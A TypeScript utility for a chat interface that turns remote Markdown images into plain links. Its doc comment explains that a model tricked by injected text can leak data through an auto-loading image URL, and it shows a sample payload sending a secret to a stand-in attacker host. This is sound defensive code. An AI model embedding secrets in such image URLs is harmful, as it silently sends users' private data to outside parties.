/**
 * Turns Markdown images that point at the web into plain links, so nothing is fetched until the
 * reader clicks. A model reply (or text it was tricked into writing) can otherwise leak data by
 * embedding it in an image URL: `![](https://evil.example/x?d=<secret>)` loads without any click.
 * Images that point at workspace files are left alone; the chat renders those through the app.
 */
export function blockRemoteImages(markdown: string): string {
  return markdown.replace(/!\[([^\]]*)\]\(\s*(<?https?:\/\/[^)\s>]+>?)([^)]*)\)/gi, (_match, alt: string, url: string) => {
    const label = alt.trim() || 'image';
    return `[blocked remote image: ${label}](${url.replace(/^<|>$/g, '')})`;
  });
}
